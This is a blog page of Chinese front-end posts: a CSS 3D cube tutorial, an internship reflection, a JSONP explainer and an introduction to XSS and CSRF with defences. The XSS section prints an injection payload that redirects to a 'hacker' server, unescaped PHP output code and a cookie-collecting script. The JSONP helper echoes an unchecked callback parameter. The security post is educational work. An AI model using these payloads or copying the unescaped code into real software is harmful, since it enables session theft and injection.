    margin: 0; /* 如果没有这个，各个面可能不居中，导致翻转不绕中心*/
    position:absolute;    /*应该使用绝对定位，因为它已经不是DOM流的形式了，更像float*/
    border:2px solid black;
    color:#fff;
    font-size:130px;
    font-weight:bold;
    text-align:center;
    line-height:190px;
    opacity:0.8;
}
</code></pre><p>所谓<code>translateZ</code>就是指在该轴方向进行位移，负值表示往正方向相反的方向移动，故而<code>translateZ(-100px)</code>的作用是往后推100个像素，浏览器会自动进行根据拉伸进行计算实际的尺寸。在这里是为了中点维持在中心，因为待会各个面还需要位移，以使得体现立体效果。</p>
<h3 id="移动，旋转元素"><a href="#移动，旋转元素" class="headerlink" title="移动，旋转元素"></a>移动，旋转元素</h3><p>现在所有的面都像一个普通平面图形一样面对着我们，接着对各个面进行处理，把各个面给拉开距离，并且旋转到合适的角度。俯视示意图如下：</p>
<p><img src="http://www.bibodeng.com/content/plugins/kl_album/upload/201310/27945e857498ff05eb14e830e98e84a3201310230919311155.png" alt="四面示意图"></p>
<p>其中正方体的边长为<strong>200px</strong>。</p>
<pre><code>#cube .front {        /*绕y轴旋转为0，故而正对我们，并且向前一步走（100像素）*/
    background:#1abc9c;
    -webkit-transform:rotateY(0deg) translateZ(100px);
       -moz-transform:rotateY(0deg) translateZ(100px);
         -o-transform:rotateY(0deg) translateZ(100px);
            transform:rotateY(0deg) translateZ(100px);
}
#cube .back {       /*绕x轴旋转180度，并且向前位移100，这个稍微有点难理解，看正文*/
    background:#3498db;
    -webkit-transform: translateZ(100px) rotateX(180deg);
       -moz-transform: translateZ(100px) rotateX(180deg);
         -o-transform: translateZ(100px) rotateX(180deg);
            transform: translateZ(100px) rotateX(180deg);
}
#cube .right {        /*绕y轴转90度*/
    background:#8e44ad;
    -webkit-transform: translateZ(100px) rotateY(90deg);
       -moz-transform: translateZ(100px) rotateY(90deg);
         -o-transform: translateZ(100px) rotateY(90deg);
            transform: translateZ(100px) rotateY(90deg);
}
#cube .left {        
    background:#34495e;
    -webkit-transform: translateZ(100px) rotateY(-90deg);
       -moz-transform: translateZ(100px) rotateY(-90deg);
         -o-transform: translateZ(100px) rotateY(-90deg);
            transform: translateZ(100px) rotateY(-90deg);
}
#cube .top {        
    background:#f39c12;
    -webkit-transform: translateZ(100px) rotateX(90deg);
       -moz-transform: translateZ(100px) rotateX(90deg);
         -o-transform: translateZ(100px) rotateX(90deg);
            transform: translateZ(100px) rotateX(90deg);
}
#cube .bottom {        
    background:#c0392b;
    -webkit-transform: translateZ(100px) rotateX(-90deg);
       -moz-transform: translateZ(100px) rotateX(-90deg);
         -o-transform: translateZ(100px) rotateX(-90deg);
            transform: translateZ(100px) rotateX(-90deg);
}
</code></pre><p>重点解释一下<code>translateZ(100px)</code>,尤其是在背面的时候，不是应该后退一步么？那是因为它的角度的问题，想象一下你站在原地，要以原点为对称点翻个身到后面的100px距离处，是不是先要向前一步走，然后翻到后面去。这就是为什么是向前一步走，而不是退后一步了。侧面也很好理解，由于本身是在xy平面的（0,0）处的，所以要往前站半个边长，才能让x轴正对身体中部。这些完全是坐标的关系导致的必须遵守的规则。</p>
<p>这样六个面就形成了。下面进行整体的旋转。</p>
<h3 id="整体的旋转"><a href="#整体的旋转" class="headerlink" title="整体的旋转"></a>整体的旋转</h3><p>是对cube整体的旋转和位移，六个面作为一个整体一起运动。注意是对cube添加css布局类。</p>
<pre><code>#cube.show-front {
  -webkit-transform:translateZ(-100px); /* -100px 表示将cube拉后到z为0的平面，这样大小就不会变化了*/
     -moz-transform:translateZ(-100px);
       -o-transform:translateZ(-100px);
          transform:translateZ(-100px);
}
#cube.show-back {
  -webkit-transform:  rotateX(-180deg) translateZ(-100px);
     -moz-transform: rotateX(-180deg) translateZ(-100px);
       -o-transform: rotateX(-180deg) translateZ(-100px);
          transform: rotateX(-180deg) translateZ(-100px);
}
#cube.show-right {
  -webkit-transform: rotateY(-90deg) translateZ(-100px);
     -moz-transform: rotateY(-90deg) translateZ(-100px);
       -o-transform: rotateY(-90deg) translateZ(-100px);
          transform: rotateY(-90deg) translateZ(-100px);
}
#cube.show-left {
  -webkit-transform: rotateY(90deg) translateZ(-100px);
     -moz-transform: rotateY(90deg) translateZ(-100px);
       -o-transform: rotateY(90deg) translateZ(-100px);
          transform: rotateY(90deg) translateZ(-100px);
}
#cube.show-top {
  -webkit-transform: rotateX(-90deg) translateZ(-100px);
     -moz-transform: rotateX(-90deg) translateZ(-100px);
       -o-transform: rotateX(-90deg) translateZ(-100px);
          transform: rotateX(-90deg) translateZ(-100px);
}
#cube.show-bottom {
  -webkit-transform: rotateX(90deg) translateZ(-100px);
     -moz-transform: rotateX(90deg) translateZ(-100px);
       -o-transform: rotateX(90deg) translateZ(-100px);
          transform: rotateX(90deg) translateZ(-100px);
}
</code></pre><p>想象一下，怎样翻转会让各个面转动到面对着你。以<code>.show-right</code>为例吧，我们需要让它绕y轴反方向转动90度，总之面是怎么旋转的，我们现在只要对cube反着来就可以了。</p>
<pre><code>/*右面的旋转角度*/
rotateY(90deg)

/*把它转回正面，我们就反着来*/
rotateY(-90deg)
</code></pre><p>这样就能达到整体的效果了。剩下的就是绑定事件，需要旋转时，给它设置对应的css类就ok了。下面是事件绑定的js代码：</p>
<pre><code>$(function(){
    // 省略其他
    // for cube
    var cubeClassArray = [
        &apos;show-front&apos;,
        &apos;show-back&apos;,
        &apos;show-right&apos;,
        &apos;show-left&apos;,
        &apos;show-top&apos;,
        &apos;show-bottom&apos;
    ];

    $(&apos;#cube_btns input&apos;).click(function(){
        var i = $(this).index();
        $(&apos;#cube&apos;).attr(&apos;class&apos;, cubeClassArray[i]);    // 设置cube的css类，进行旋转
    });

});
</code></pre><p>好，一切大工告成了，你可以看到一个很酷的旋转六面体。</p>
<p><img src="http://www.bibodeng.com/content/plugins/kl_album/upload/201310/51d8fd0bc5f9f4258f731e504edbd0572013102309512713254.png" alt="3D cube"></p>
<p>参考：</p>
<ul>
<li>了解transform和animation<a href="http://beiyuu.com/css3-animation/" target="_blank" rel="noopener">css3动画详解</a></li>
</ul>
<hr>
<p>end</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2013/10/20/十月小记/" itemprop="url">
                  十月小记
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2013-10-20T09:46:45+08:00" content="2013-10-20">
              2013-10-20
            </time>
          </span>

          

          
            
          

          
	
          
          
             <span id="/2013/10/20/十月小记/" class="leancloud_visitors" data-flag-title="十月小记">
               &nbsp; | &nbsp;
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">阅读次数 </span>
               <span class="leancloud-visitors-count"></span>
              </span>
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="十月小记"><a href="#十月小记" class="headerlink" title="十月小记"></a>十月小记</h1><p>by bibodeng 2013-10-19</p>
<h2 id="实习"><a href="#实习" class="headerlink" title="实习"></a>实习</h2><p>在这几个月里，发生的最重要的事情就是实习。从七月初，到前几天离职，3个月零15天。也算是蛮长的了。在实习中我尝试到了很多不同的东西，认识了一些有趣的人。同时也对我的身心有了一定的冲击，有健康的和不健康的。</p>
<h3 id="身体"><a href="#身体" class="headerlink" title="身体"></a>身体</h3><p>首先说说身体，在学校上课，我们都舒舒服服地坐着，而且不会一整天都呆在电脑面前。但是工作不一样，几乎一天八小时都坐在电脑面前，盯着屏幕，对于眼睛和脊椎都是很大的考验。刚开始来的时候，用的是台式机，台式机比较高，对坐姿要求比较高，但是累了之后一般姿势就没有那么好了，所以容易扭曲，导致脖子会有酸痛，一开始的时候这种感觉特别强烈。后来，我用自己的笔记本办公，这样脖子好受一些了，因为桌子比椅子要高出许多，用台式的时候感觉还行，但是用笔记本的时候，发现自己的手肘部分会长期支撑上半身，变得很疼痛。而且由于手硬，柔韧性不太好，所以敲键盘多了也会产生一定的疼痛。当然这也是和键盘的尺寸有关系的，手指太长了对于打字不是太方便，另外也和个人的打字习惯有关系，我习惯用小指来按<code>Ctrl</code>键，而且养成了保存的习惯，所以非常容易劳累。很奇特的是，当我全神贯注在工作的时候，往往注意不到这种不适，在一个问题反复折腾的时候，就会比较容易累。值得一提的是，长期在电脑面前，我的眼睛居然还行，并没有觉得特别地劳损。但是当看到一些不近视的程序员同事们的时候，还是会有点诧异。</p>
<p>工作后，很明显的一件事就是锻炼减少了，很多人一周都不锻炼一次，最多去打一次羽毛球或者乒乓球，当需求催得紧的时候，整个人都投入进去了，很难抽出时间去搞运动。健康是很重要的，即使现在看起来运动的要求并不紧迫，但是等到肥胖来临，或者健康状况下降的时候，我们就会后悔了。人是首先健康地生活，然后才能健康地工作。</p>
<h3 id="技能"><a href="#技能" class="headerlink" title="技能"></a>技能</h3><p>工作中，有压力的情况下，技能习得的效率是比平时在校园里悠闲自在来得高一点。我会不自主地花时间去解决我的剩余的功能实现以及debug。任何事情，只要你开始花时间去了解它，那么你就已经开始在解决问题了。第一步往往很重要，它标志着你克服了心理上的障碍，动员了全身力量去完成目标。这个力量是非常巨大的，尤其是在压力大增的情况下，你甚至会比平常更加出色地完成任务，我自己也曾暗暗赞叹自己居然能够想出这么好的解决办法。这应该归功于我的头脑，以及我付出的艰辛。</p>
<p>最好的技能习得，就是在实践中学习。在学校，比较偏重的是理论的学习，除了实验课，我们都懒得写代码，但是在公司，没有代码就没有进度。而且，我们从别人那里，或者书籍文档中，会了解到一些新的东西，补充我们原来的不成熟的认识。项目中的需求，也驱动着我去学习新的东西，例如flash接口，canvas等等，还有一大部分就是兴趣驱使。<em>问题是进步的重要的标志</em>，有了问题，就标志着我们要去解决问题，也就会使得我们对知识及技能更加熟练，认识更加深刻。如果没有问题，那么必定是没有做多少思考，慢慢会在工作的重压中变得越来越愚钝。问题本身也推动着我们的进步，遇到问题应该高兴，弄懂之后，便进步了一点（举个例子，如果不是为了解决一个布局问题，我也不会从七宝那里得知clear属性是清除自身的浮动，而不是清除别人的浮动）。</p>
<h2 id="领悟"><a href="#领悟" class="headerlink" title="领悟"></a>领悟</h2><p>前几天看到一篇陌陌的同学写的文章<a href="http://craylin.blog.163.com/blog/static/169631722201261421149449/" target="_blank" rel="noopener">写给进步缓慢却全然不知的IT人</a>，他说的几句话打醒了我：</p>
<blockquote>
<p>这些孩纸们入了某一行，涉足某个领域，却从没想过这个领域最高境界是啥样子，最牛逼的几个人是谁。他们的评判标准就只看是否满足领导的要求，是否比身边另两个笨蛋利索些，是否成为他们的技术指导。</p>
</blockquote>
<p>的确，我们接触一个行业，一种技能，都不想想最高境界是什么，于是狭隘地以为做到还行就可以了，而且完全不知道自己和更高层次的人的差别。这是非常恐怖的事情，更加坚定我心中<strong>眼界</strong>在学习和生活中的重要性。同时也给我们一个启发，学习一个专业的方法应该是如何的？</p>
<ul>
<li>了解它是什么能干什么 （历史）</li>
<li>最牛的人是谁，怎么向他们靠拢</li>
<li>踏实去做</li>
</ul>
<p>我连夜找出了几个在前端开发领域的大牛，如 玉伯，js编程精粹作者 等等，这里有一个在线ppt，给你一个发现web前端大牛的机会： <a href="https://speakerdeck.com/josephj/f2e-the-keystone" target="_blank" rel="noopener">前端开发实务</a>。关注大牛，等于你多了一个武功盖世的导师，给你指点了方向。那你自然就会朝着牛逼的方向前行。我自己也发现，比平时更喜欢上博客园了，而不是去51CTO, 我还看了一句话 “来博客园的都是大牛，要么就是朝着大牛发展的小牛”，看着这句话，我笑了。某个时刻，我感觉到自己就要朝着牛逼发展了，心中非常地激动，好像浑身都在升华一样，这种感觉就像枯草盼望到了春雨，浑身都在萌动，小宇宙在爆发。</p>
<p>曾经有一段日子，我每天都很忙，其实实习期间，我养成了早起的习惯（确切地说，我大学期间就是这个习惯），往往六七点就起来了，静坐一下，写一下日记，然后就洗涮出发赶公车。我很早就去到公司，然后浏览一下博客，写点代码。但是我们部门的总监，比我还早，7点多就到公司了，有几次我在等公交的时候遇见他，还对了一下时间，我的快了十多分钟，他意味深长地说了一句“时间还是要调准的，否则会错过很多事情”，然后就互相问了一下那么早到公司都做什么，我问他要不要写代码，他说还要写代码。而且每次碰到他，他都说“好好努力，争取留在公司”。</p>
<p>忙碌的日子，非常充实，想的东西也非常实在。有几次回来已经非常累了，倒在床上睡着了，第二天才起来洗澡。那时候，感觉自己和时间融合在了一起，随着它一起流动。我很享受这样的时光，也很喜欢深圳的秋天，早上吹一阵风，就能精神一整天。而晚上搭公车回家，也会觉得异常放松，连皮肤也变得细腻起来，这些微妙的感觉不知道别人有没有。深圳还是挺宜居的，几次在街上漫步都感觉非常惬意，但是没有人陪，走了几步就掉头回宿舍了。</p>
<h3 id="连接万岁"><a href="#连接万岁" class="headerlink" title="连接万岁"></a>连接万岁</h3><p>人是自然的一部分，其使命是与自然联接，融于一体，人与人之间，也应该连接起来（想象一下阿凡达怎么驾驭飞龙的）。如果你掌握一样纯熟的技能，你就好像与这个技能本身连接起来，并且对于它的本质具有敏感的直觉。凡事就是这样，open your mind,然后你才可以接受各种信号。良好的情景，对于连接具有很大的沉浸作用。这就是为什么嘹亮军歌让你不自觉挺直身体，而太极音乐则让你思绪飘渺，动作自然流畅。</p>
<p>再来谈谈人与人的联接，某天看到一句这样的话：</p>
<blockquote>
<p>爱是感应的能力，和response更贴近</p>
</blockquote>
<p>对此，我深以为然，没有感应了，那就没有感情了，如果有只能算作留恋。人与人之间，就好像两台电脑，要互相都打开心灵窗口，才能沟通。平常与人交往中，我们常常send,receive, 要是只有send，没有receive，那么就没有了下文。这是断开了连接，失去了感应的能力，人际关系也渐渐淡了。还有一种情况，也很糟糕，那就是交际中带有负面的情绪，例如猜忌，尴尬，则会严重影响沟通的质量，因为这本身也是一种关闭，摒弃了坦诚的沟通。如果不予以改善的话，必定会导致关系的破裂，而坦诚的沟通又会修复这样的破裂。通信的时机也很重要，要是对方处在忙碌时期，心情急躁，根本无暇理睬稍微次要的东西，那么这样的沟通也将沦落成为敷衍。人们对于敷衍，可是非常地敏感的。从对方的眼神中，言语中很容易就察觉到细微的不耐烦，如果心不在焉那还不如不说话。下面总结一下，质量不高的沟通：</p>
<ul>
<li>不确定，不安全的 （猜疑/尴尬/恐惧）</li>
<li>传输质量不高的（心不在焉）</li>
<li>不可理解的 （都不懂，对牛弹琴啊）</li>
</ul>
<p>沟通的内容不在于聊什么，最重要的是通信双方的互相信任，敞开心扉。即使是与物打交道的时候，即使最死的东西，如石头，它也有它的表达，如果我们心灵中对其有发现美的眼睛，那么也会对其动心。而你也会以为它其实是有神韵的。和人交流会更加复杂，但是总体的原则就是保持阳光，和谐的心态，避开上面所说的负面情绪，则关系就不会降温，而质量也会一直较高。所以啊，男生表白，不要搞得尴尬，恐惧，人最首要的需求是生存，如果都没有安全感，对方很容易就say no的。也不要过分去猜测对方的意图，不要过分的压迫感，顺其自然就好了，营造一个良好的氛围，比啥都重要。</p>
<hr>
<p>end</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2013/10/10/理解JSONP原理与使用/" itemprop="url">
                  理解JSONP原理与使用
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2013-10-10T23:51:00+08:00" content="2013-10-10">
              2013-10-10
            </time>
          </span>

          

          
            
          

          
	
          
          
             <span id="/2013/10/10/理解JSONP原理与使用/" class="leancloud_visitors" data-flag-title="理解JSONP原理与使用">
               &nbsp; | &nbsp;
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">阅读次数 </span>
               <span class="leancloud-visitors-count"></span>
              </span>
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="关于JSONP"><a href="#关于JSONP" class="headerlink" title="关于JSONP"></a>关于JSONP</h1><p>by bibodeng 2013-10-10</p>
<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>之前也不知道什么东东是JSONP（尽情笑话我吧）,只是听我的导师说前端和后台分开放，但是其绑定了不同的子域名，于是需要使用jQuery里面的JSONP支持，给服务端发送请求的时候给一个callback=?参数，然后返回的时候用callback包裹里面的数据。当我看到这篇关于 <a href="http://www.ibm.com/developerworks/cn/web/wa-aj-jsonp1/" target="_blank" rel="noopener">跨域JSON请求</a> 的文章的时候我才理解了这个做法。</p>
<h2 id="什么是JSONP"><a href="#什么是JSONP" class="headerlink" title="什么是JSONP"></a>什么是JSONP</h2><p>到底什么是JSONP，其原理如何呢？<br>JSONP 是英文 json in padding,json就是javascript的字符串表现形式，服务器端可以对json进行收发解析。上面的文章给出了很详尽的解释，我就我学习中遇到的困难进行说明。</p>
<p>由于无法无法从不同源头的网站上直接获取JSON，但是我们平常的<code>&lt;script&gt;</code>标签是能够获取到别的网站的js文件，想想我们常常使用google的jquery吧，就像图片一样，可以随意使用。那么我们是不是可以将这个脚本的地址指向一个动态生成JSON的脚本呢？从而让它能够将生成的东西传到前端。显然这是可以的，和引入js相比只是动态与不动态的区别而已。但是传回来的东西应该是js代码，JSON不能直接使用，于是就用一个回调函数进行包裹。当它传回前端的时候就可以直接执行了。</p>
<p>维基百科的解释很容易懂，尤其是这个padding的意思：</p>
<p>这个时候，把 <code>&lt;script&gt;</code> 元素的 src 属性设成一个回传 JSON 的 URL 是可以想像的，这也代表从 HTML 页面透过 script 元素抓取 JSON 是可能的。然而，一份 JSON 文件并不是一个 JavaScript 程式。为了让浏览器可以在<code>&lt;script&gt;</code>元素执行，从 src 里 URL 回传的必须是可执行的 JavaScript。在 JSONP 的使用模式里，该 URL 回传的是由函数呼叫包起来的动态生成 JSON，这就是JSONP 的“填充（padding）”或是“前辍（prefix）”的由来。</p>
<h2 id="padding的形象体验"><a href="#padding的形象体验" class="headerlink" title="padding的形象体验"></a>padding的形象体验</h2><p>我在实际的编程中也用到了JSONP，本来可以直接使用<code>$callback.&#39;(&#39;.json_encode($data).&#39;)&#39;;</code>的方式直接返回的，但是这样每次都要写括号，很难看。于是我就将它写成了一个函数，并且支持多个参数：</p>
<pre><code>// PHP代码

// 带回调的响应
function callbackResponse($callback, $status=200, $data=&quot;&quot;, $extra=array())
{
    // 这里就是padding了,中间的JSON被夹起来了！形象吧
    echo $callback.&apos;(&apos;.ajaxResponse($status, $data, $extra).&apos;)&apos;;
    // include callback return of server end json data
    exit(0);
}

// 还是应该对返回内容进行merge后encode
function ajaxResponse($status=200, $data=&quot;&quot;, $extra=array()) {
    $ret = array(&quot;status&quot;=&gt;$status, &quot;data&quot;=&gt;$data);
    $ret = array_merge($ret, $extra);
    return json_encode($ret);
}

// ————————调用的例子————————
$callback = $_GET[&apos;callback&apos;];
callbackResponse($callback, 200, &quot;我爱编程&quot;);
</code></pre><p>在客户端可以是这样请求并处理的：</p>
<pre><code>// js代码
// callback作为一个参数传到服务端
$.getJSON(php_path+&apos;php/index.php?callback=?&apos;, function(ret_data) {
    if (ret_data.status == 200) 
    {
        console.log(ret_data[&apos;data&apos;]); // 我爱编程
        return;
    }
});
</code></pre><h2 id="jQuery的做法"><a href="#jQuery的做法" class="headerlink" title="jQuery的做法"></a>jQuery的做法</h2><p>上面看到jQuery中的$.getJSON方法支持在链接中直接放入callback函数，并且callback=?,其实它是把$.getJSON的第二个参数（一个匿名函数）作为一个callback函数，我们查看服务器返回的数据常常能够看到 <code>jQuery152042227689944248825_1317400799214({&quot;status&quot;: 200,&quot;data&quot;:&quot;我爱编程&quot;})</code>形式的包。本来是一个名字的，例如一个叫parseData的函数，callback=parseData,当JSONP返回之后，将直接执行<code>parseData({&quot;status&quot;: 200,&quot;data&quot;:&quot;我爱编程&quot;})</code>,也就是回调了。而jQuery直接帮我们处理了匿名函数的问题，相当于产生了一个名字随机的对象，让它等于这个匿名的回调函数。具体的还得看jQuery的源代码（笔者才看了一点，还没到能够解决这个问题的程度）。</p>
<p>如下jQuery源码:</p>
<pre><code>// 获取时间戳
var jsc = jQuery.now(), 
jsre = /(\=)\?(&amp;|$)|\?\?/i;

// 默认的jsonp设置
jQuery.ajaxSetup({
  jsonp: &quot;callback&quot;,   // 默认使用callback
  jsonpCallback: function() {
    return jQuery.expando + &quot;_&quot; + ( jsc++ );    // 构造回调前缀
  }
});
// 下面的代码，额。。
jQuery.ajaxPrefilter( &quot;json jsonp&quot;, function( s, originalSettings, jqXHR ) {

  var inspectData = s.contentType === &quot;application/x-www-form-urlencoded&quot; &amp;&amp;
    ( typeof s.data === &quot;string&quot; );

  if ( s.dataTypes[ 0 ] === &quot;jsonp&quot; ||
    s.jsonp !== false &amp;&amp; ( jsre.test( s.url ) ||
        inspectData &amp;&amp; jsre.test( s.data ) ) ) {

    // 设置jsonCallback,当回调时，就能直接调用了
    var responseContainer,
      jsonpCallback = s.jsonpCallback =
        jQuery.isFunction( s.jsonpCallback ) ? s.jsonpCallback() : s.jsonpCallback,
      previous = window[ jsonpCallback ],
      url = s.url,
      data = s.data,
      replace = &quot;$1&quot; + jsonpCallback + &quot;$2&quot;;

    if ( s.jsonp !== false ) {
      url = url.replace( jsre, replace );
      if ( s.url === url ) {
        if ( inspectData ) {
          data = data.replace( jsre, replace );
        }
        if ( s.data === data ) {
          url += (/\?/.test( url ) ? &quot;&amp;&quot; : &quot;?&quot;) + s.jsonp + &quot;=&quot; + jsonpCallback;
        }
      }
    }

    s.url = url;
    s.data = data;

    window[ jsonpCallback ] = function( response ) {
      responseContainer = [ response ];
    };

    jqXHR.always(function() {

      window[ jsonpCallback ] = previous;

      if ( responseContainer &amp;&amp; jQuery.isFunction( previous ) ) {
        window[ jsonpCallback ]( responseContainer[ 0 ] );
      }
    });

    s.converters[&quot;script json&quot;] = function() {
      if ( !responseContainer ) {
        jQuery.error( jsonpCallback + &quot; was not called&quot; );
      }
      return responseContainer[ 0 ];
    };

    s.dataTypes[ 0 ] = &quot;json&quot;;


    return &quot;script&quot;;
  }
});
</code></pre><p>// TODO: 读通源代码</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://zh.wikipedia.org/wiki/JSONP" target="_blank" rel="noopener">wikipadia</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2013/10/05/初探web中的XSS和CSRF攻击/" itemprop="url">
                  初探web中的XSS和CSRF攻击
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2013-10-05T08:19:50+08:00" content="2013-10-05">
              2013-10-05
            </time>
          </span>

          

          
            
          

          
	
          
          
             <span id="/2013/10/05/初探web中的XSS和CSRF攻击/" class="leancloud_visitors" data-flag-title="初探web中的XSS和CSRF攻击">
               &nbsp; | &nbsp;
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">阅读次数 </span>
               <span class="leancloud-visitors-count"></span>
              </span>
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="理解web安全"><a href="#理解web安全" class="headerlink" title="理解web安全"></a>理解web安全</h1><p>这几天接触了一下web安全，其中涉及到:</p>
<ul>
<li>XSS攻击 —— cross site script</li>
<li>CSRF攻击 —— cross site request forgery</li>
<li>XSS+CSRF(蠕虫)</li>
<li>SQL注入</li>
</ul>
<p>首先要理解XSS和CSRF，因为这是两种利用web缺陷发起的基本攻击，但是其威力也不容小视。首先我们要认识到HTTP协议是无状态的，也即一次请求响应和下一次没有关系，或者说没有状态之间的联系，而应用中必须保持着某种状态，例如在cookie中存一些数据。而web中的session其实是基于cookie的，只是记录的这个cookie是经过加密的一个sessionid，从而用来确认用户身份。曾经听说过网站中这次登录，如果用户选择了下次自动登录，则服务器将会记录一个sessionid,作为下次登陆的凭证，但是只使用一次，下次登录又申请新的，服务器每次发送请求，都带上了该网站的cookie，但是cookie是可以在客户端被修改的。cookie保存在浏览器中的确是很危险的，在后面的例子中我们就可以看到它是怎样被轻易拿走的。</p>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>XSS攻击分为两种：</p>
<ul>
<li>反射型</li>
<li>存储型</li>
</ul>
<p>所谓反射型，就是点击了某个链接触发了某个漏洞，从而被利用发送相关信息到黑客服务器上，被窃取。另外一种是常见的评论或者是帖子，包含了一些恶意代码，但是被提交存储到了数据库中，这样每次其他用户访问该网页，也会受到侵扰，其中夹带很多恶意链接，用户点了之后或许会受到攻击。</p>
<p>反射型，很常见的就是构造了一个带有恶意的链接，比如有如下表单：</p>
<pre><code>&lt;body&gt;
&lt;form action=&quot;php/index.php&quot; method=&quot;POST&quot;&gt;
    &lt;input type=&quot;text&quot; name=&quot;user_name&quot;&gt;&lt;br&gt;
    &lt;input type=&quot;password&quot; name=&quot;user_passwd&quot;&gt;&lt;br&gt;

    &lt;textarea name=&quot;user_descr&quot; rows=5 cols=80&gt;&lt;/textarea&gt;&lt;br&gt;
    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;
&lt;/form&gt;
&lt;/body&gt;
</code></pre><p>是提交评论或者是注册，里面提供了一些可以注入的地方，例如我们往textarea注入恶意代码，也就是看是否能够让服务器存储起来，渲染出来祸害别的用户。假设黑客填入了如下的信息：</p>
<pre><code>&lt;a href=&quot;http://abc.com&quot;   onclick=&quot;window.location=&apos;http://localhost/hacker/index.php&apos;;&quot;&gt; hello  &lt;/a&gt;
</code></pre><p>服务器端直接获取用户数据，予以存储，这里仅仅做一个模拟，直接把用户数据输出。相当于注入逃过了PHP的检查，从而成为存储型XSS。</p>
<pre><code>$name = $_POST[&apos;user_name&apos;];
$passwd = $_POST[&apos;user_passwd&apos;];
$descr = $_POST[&apos;user_descr&apos;];

print $name;
print &apos; &apos;;
print $passwd;


print &apos;&lt;span&gt;&apos; . $descr . &apos;&lt;/span&gt;&apos;;
</code></pre><p>黑客的服务器，用来获取用户的cookie</p>
<pre><code>&lt;?php
$cookie = $_GET[&apos;c&apos;];
// 写到一个文件里面
print_r($cookie);
</code></pre><p>chrome浏览器会报错误，对于表单中的敏感字符串如script标签，js代码做了处理，所以提交不到服务端：</p>
<p><img src="http://www.bibodeng.com/content/plugins/kl_album/upload/201310/112db41ad44e2bbeb0dc695f3dd00fc92013100500193628335.png" alt="XSS攻击警告"></p>
<p>但是IE内核的搜狗浏览器却中招了，当点击该链接的时候，将发送该用户的cookie到hacker的服务器上，这样就达到了初步的攻击。nodeJS社区上有更加精彩的XSRF攻击，利用注入的代码，获取用户信息，并且假冒用户发出各种请求（服务器中处理各种请求的就是功能函数，直接用url可访问），导致alert满天飞，并且自动顶帖。其实所有允许嵌入html标签的地方，都是相当危险的。</p>
<p>对于存储型的攻击，服务器端应该对用户的输入中敏感字符进行转义。严格来讲，不能信赖我们发送出去的客户端，更加不能信赖用户的输入。</p>
<p>上面例子中google浏览器对于提交的数据中带有脚本拒不运行，但是在搜狗兼容模式下，居然注入成功了，黑客提交的数据假设已经存储起来了，未加任何的处理直接在模板中直接输出，而用户点击了之后，会触发事件，从而向恶意服务器发送用户的cookie信息。发送的方式有很多种，例如图片src请求，location.href直接跳转，以及某些事件触发脚本运行，例如onclick。</p>
<p>防范的方法：</p>
<ol>
<li>替换或过滤<code>&lt;script&gt;</code>等标签</li>
<li>输出html标签时进行转义，防止恶意代码运行（大部分博客的评论都采用此法）。</li>
</ol>
<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>跨站请求伪造，就是说恶意网站窃取用户的身份及权限，到某个正常网站上进行操作。例如自动发微博，加关注，转帐，消费等，对用户数据及财产带来危害。</p>
<p>由于web的客户端一般是公开的，而服务端的处理地址已知，这样就可以模拟用户的请求，向服务端发送请求。例如当用户在浏览某正常网站A的时候，并登陆，在浏览器端记录了cookie等数据，这时候点开了一个恶意网站B,B向A网站发起了某个请求，例如加关注，其中因为同一个浏览器下，各个进程之间甚至可以共享cookie等数据，也可以是XSS注入中提供的cookie等数据，这样就可以骗过A网站搞破坏了。</p>
<p>其实服务器端从将客户端代码发送到客户之后，就不应该信任客户端了，因为它可能被篡改，或者被模拟。故而需要一个机制确认这就是我自己发出去的客户端，而不是伪造的。常见的方法就是：</p>
<ul>
<li>验证码 将验证码记录在session中，由服务器生成，生成图片发送到客户端，验证一致则认定安全</li>
<li>在表单中设置一个hidden项 服务器生成随机数，发送到客户端，提交表单时候一起提交到服务器验证</li>
</ul>
